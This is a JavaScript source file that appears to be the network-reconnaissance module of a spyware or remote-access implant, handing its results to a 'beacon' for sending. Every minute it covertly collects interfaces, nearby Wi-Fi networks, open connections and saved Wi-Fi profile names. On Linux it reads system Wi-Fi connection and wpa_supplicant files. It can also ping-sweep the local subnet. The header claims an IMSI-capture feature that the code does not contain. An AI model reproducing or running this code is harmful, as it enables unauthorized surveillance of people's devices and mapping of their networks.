/**
 * Network Intelligence Module
 * WiFi probe history, LAN scanner, IMSI capture (mobile), network topology.
 */

const si = require("systeminformation");
const { exec } = require("child_process");
const config = require("../config");
const logger = require("../logger");

class NetworkModule {
  constructor(beacon) {
    this.beacon = beacon;
    this.timer = null;
  }

  start() {
    this._collect();
    this.timer = setInterval(() => this._collect(), 60000); // every minute
    logger.debug("NetworkModule started");
  }

  stop() {
    clearInterval(this.timer);
  }

  async _collect() {
    try {
      const [ifaces, wifi, connections] = await Promise.all([
        si.networkInterfaces(),
        si.wifiNetworks().catch(() => []),
        si.networkConnections().catch(() => []),
      ]);

      const payload = {
        interfaces: ifaces.map(i => ({
          name: i.iface,
          ip4: i.ip4,
          ip6: i.ip6,
          mac: i.mac,
          type: i.type,
          speed: i.speed,
        })),
        wifi: wifi.map(w => ({
          ssid: w.ssid,
          bssid: w.bssid,
          signal: w.signalLevel,
          frequency: w.frequency,
          security: w.security,
          channel: w.channel,
        })),
        connections: connections.slice(0, 50).map(c => ({
          protocol: c.protocol,
          local: `${c.localAddress}:${c.localPort}`,
          remote: `${c.peerAddress}:${c.peerPort}`,
          state: c.state,
          pid: c.pid,
        })),
        probeHistory: this._getProbeHistory(),
        ts: Date.now(),
      };

      this.beacon.queue_data("network", payload);
    } catch (err) {
      logger.error("NetworkModule error:", err.message);
    }
  }

  _getProbeHistory() {
    const platform = config.platform;
    if (platform === "win32")  return this._windowsProbeHistory();
    if (platform === "darwin") return this._macosProbeHistory();
    if (platform === "linux")  return this._linuxProbeHistory();
    return [];
  }

  _linuxProbeHistory() {
    const { execSync } = require("child_process");
    try {
      // NetworkManager (most distros)
      const out = execSync("nmcli -t -f NAME connection show 2>/dev/null",
        { encoding: "utf8", timeout: 3000 });
      return out.split("\n").map(l => l.trim()).filter(Boolean);
    } catch {}
    try {
      // Fallback: read NetworkManager connection files directly
      const { readdirSync, readFileSync } = require("fs");
      const dir = "/etc/NetworkManager/system-connections";
      return readdirSync(dir)
        .filter(f => f.endsWith(".nmconnection") || !f.includes("."))
        .map(f => {
          try {
            const content = readFileSync(`${dir}/${f}`, "utf8");
            const m = content.match(/^ssid=(.+)$/m);
            return m ? m[1].trim() : f;
          } catch { return f; }
        });
    } catch {}
    try {
      // wpa_supplicant fallback
      const wpa = require("fs").readFileSync("/etc/wpa_supplicant/wpa_supplicant.conf", "utf8");
      return [...wpa.matchAll(/ssid="([^"]+)"/g)].map(m => m[1]);
    } catch {}
    return [];
  }

  _windowsProbeHistory() {
    try {
      const result = require("child_process").execSync(
        "netsh wlan show profiles", { encoding: "utf8", timeout: 3000 }
      );
      const profiles = [];
      const lines = result.split("\n");
      lines.forEach(line => {
        const match = line.match(/All User Profile\s*:\s*(.+)/);
        if (match) profiles.push(match[1].trim());
      });
      return profiles;
    } catch {
      return [];
    }
  }

  _macosProbeHistory() {
    try {
      const result = require("child_process").execSync(
        "networksetup -listpreferredwirelessnetworks en0 2>/dev/null || true",
        { encoding: "utf8", timeout: 3000 }
      );
      return result.split("\n").slice(1).map(s => s.trim()).filter(Boolean);
    } catch {
      return [];
    }
  }

  async lanScan() {
    const ifaces = await si.networkInterfaces();
    const localIp = ifaces.find(i => i.ip4 && !i.ip4.startsWith("127"))?.ip4;
    if (!localIp) return [];

    const subnet = localIp.split(".").slice(0, 3).join(".");
    const results = [];

    // Parallel ping sweep of /24 subnet
    const promises = Array.from({ length: 254 }, (_, i) => {
      const ip = `${subnet}.${i + 1}`;
      return new Promise(resolve => {
        const cmd = process.platform === "win32"
          ? `ping -n 1 -w 200 ${ip}`
          : `ping -c 1 -W 1 ${ip}`;
        exec(cmd, { timeout: 2000 }, (err, stdout) => {
          if (!err && stdout.includes("TTL")) {
            results.push({ ip, alive: true });
          }
          resolve();
        });
      });
    });

    await Promise.all(promises);
    this.beacon.queue_data("lan_scan", { subnet, hosts: results, ts: Date.now() });
    return results;
  }
}

module.exports = NetworkModule;
